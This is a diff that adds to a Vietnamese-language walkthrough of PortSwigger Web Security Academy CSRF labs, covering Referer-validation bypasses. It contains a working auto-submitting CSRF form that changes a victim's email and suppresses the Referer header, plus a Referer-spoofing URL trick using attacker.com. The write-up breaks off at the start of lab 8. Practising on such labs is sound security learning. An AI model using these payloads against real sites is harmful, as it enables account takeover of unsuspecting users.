@@ -53,5 +53,27 @@ Sau khi click "Deliver to victim", bài lab được giải thành công.
 # 6. CSRF where token is duplicated in cookie
 
 # 7. CSRF where Referer validation depends on header being present
+Ta thấy việc email có được thay đổi thành công hay không phụ thuộc vào việc Referer header có domain là `https://0a90007603f431c2c167ad45006f00b0.web-security-academy.net` hay không. Tuy nhiên nếu ta xóa đi Referer header, email vẫn bị thay đổi.
+
+Như vậy, ta vào exploit server và cấu hình đoạn HTML sau:
+```
+<html>
+<head>
+<meta name="referrer" content="never">
+</head>
+<body>
+<form id="form" method="POST" action="https://0a90007603f431c2c167ad45006f00b0.web-security-academy.net/my-account/change-email">
+<input type="hidden" name="email" value="attacker@gmail.com">
+</form>
+
+<script>form.submit()</script>
+</body>
+</html>
+```
+
+Thẻ `<meta name="referrer" content="never">` sẽ ngăn không đưa dữ liệu vào header Referer của request tiếp theo. Sau khi click "Deliver to victim", kết quả thành công. 
 
 # 8. CSRF with broken Referer validation
+Ta thấy chỉ khi Referer header có domain là `https://0af000b004b75bb2c19df8f1007a00bf.web-security-academy.net` thì request đổi email mới được thực hiện thành công. Thử với payload là `https://attacker.com#https://0af000b004b75bb2c19df8f1007a00bf.web-security-academy.net`, kết quả email vẫn bị đổi. Như vậy server chỉ kiểm tra trong Referer header có chứa chuỗi `https://0af000b004b75bb2c19df8f1007a00bf.web-security-academy.net` hay không.
+
+Vào exploit server
